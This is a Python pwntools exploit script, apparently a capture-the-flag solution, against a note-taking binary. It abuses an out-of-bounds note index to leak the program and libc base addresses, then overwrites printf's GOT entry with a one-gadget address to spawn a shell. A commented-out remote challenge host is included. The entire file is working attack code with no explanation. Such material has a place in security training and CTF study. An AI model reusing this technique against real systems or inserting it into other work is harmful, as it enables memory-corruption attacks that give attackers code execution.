#!/root/venvs/pwn/bin/python

from pwn import *
from datetime import datetime, timezone

exe = ELF("app_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "WARNING"
context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
# break do_add_note
break do_edit_note
# break get_index
# break do_view_note
# brva 0x00000000000015D1
# disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
U64 = (1 << 64) - 1
  
def calc_distance(target:int):
    delta = target-0x00000000000046E0
    if (delta < -8):
        distance = delta // 8
    else:
        distance = delta
    unsiged_index = distance & U64
    return unsiged_index

def calc_unsigned_for_ida_offsets(ida_noteptrs_off:int, ida_target_off:int):
    delta = ida_target_off - ida_noteptrs_off   # byte delta (can be negative)
    # Must be exactly 8-byte aligned to address a slot
    if delta % 8 != 0:
        raise ValueError("UNALIGNED: delta = 0x%x not multiple of 8" % (delta & U64))
    idx = delta // 8   # signed index (negative means below noteptrs)
    unsigned = idx & ((1 << 64) - 1)
    return unsigned

def add_note_bytes(address:int):
	total_len=155
	chunk = p64(address)
	payload = (chunk * ((total_len // len(chunk)) + 1))[:total_len]

	io.sendlineafter(b"> ", b"0")
	io.sendafter(b"Enter note content > ", payload)
 
def add_note_new(payload:bytes):
	io.sendlineafter(b"> ", b"0")
	io.sendlineafter(b"Enter note content > ", payload)
    
def edit_note(index:int, content:bytes):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"edit > ", str(index).encode())
    io.sendlineafter(b"Enter note content: ", content)
    
def view_note(index:int):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"to view > ", str(index).encode())
    
def delete_note(index:int):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"\n", str(index).encode())
    
def view_note_with_leak(index:int):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"to view > ", str(index).encode())
    out = io.recvlines()
    date = out[1].split(b" ")[2]
    hour = out[1].split(b" ")[3]
    clock_type = out[1].split(b" ")[4]
    content = out[2].split(b" ")[1][1:3]
    date_str = (date + b" " + hour + b" " + clock_type).decode()
    epoch32 = int(datetime.strptime(date_str, "%d/%m/%Y %I:%M:%S %p").replace(tzinfo=timezone.utc).timestamp()) & 0xffffffff
    note_val = int.from_bytes(content, "little")
    leak = (note_val << 32) | epoch32
    return leak
    
def view_note_leak():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"to view > ", b"-")
    
def leak_binary():
	target = 0x4050 # .data:0000000000004050 __dso_handle    dq offset __dso_handle
	binary_leak = view_note_with_leak(calc_distance(target))
	exe.address = binary_leak - 0x4050
	print(f"binary base: {hex(exe.address)}")
 
def leak_libc():
	add_note_new(b'f'* 4 + p64(exe.got['setbuf'])) 
	target = 0x40A8 # notes[1]
	libc_leak = view_note_with_leak(calc_distance(target))
	libc.address = libc_leak - 0x87fe0
	print(f"libc base: {hex(libc.address)}")
 
def exploit():
    delete_note(0)
    add_note_new(b"f" * 4 + p64(exe.got['printf']-4)) # we add 4 'f's so the actual address we want to overwrite will be placed at notes[1]
    target = 0x40A8
    payload = flat(
        p64(libc.address + 0xebd3f)

	)
    edit_note(calc_distance(target), payload)
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
io = start_local(isDebug)

######## REMOTE ########
# remote_address = ""
# io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
# HOST = "2563fccc-a63c-45f7-ac8a-8d0b8201535c.openec.sc"
# PORT = 31337
# io = remote(HOST, PORT, ssl=True, sni=HOST)

io.timeout = 1

leak_binary()
leak_libc()

pop_rdi = libc.address + 0x000000000002a3e5 # pop rdi; ret;
ret = pop_rdi + 1
bin_sh = next(libc.search(b"/bin/sh\0"))
system = libc.sym['system']

exploit()
io.interactive()


